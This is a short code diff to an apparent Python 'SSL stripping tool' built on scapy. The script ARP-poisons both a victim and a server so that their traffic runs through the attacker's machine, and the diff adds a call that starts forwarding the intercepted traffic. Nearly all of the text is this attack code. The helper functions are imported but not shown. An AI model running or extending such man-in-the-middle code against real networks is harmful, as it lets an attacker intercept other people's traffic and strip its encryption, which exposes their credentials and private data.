@@ -3,6 +3,7 @@ from scapy.all import *
 import sys
 from validate import validate
 from arppoison import arppoison
+from forward import startforwarding
 
 #collect input from command line
 parser = argparse.ArgumentParser(description = 'SSL stripping tool')
@@ -21,3 +22,5 @@ arppoison(args.victimIP, args.serverIP, args.attackerIP, args.ifa)
 
 #poison client entry of ARP table of server
 arppoison(args.serverIP, args.victimIP, args.attackerIP, args.ifa)
+
+startforwarding(args.serverIP)
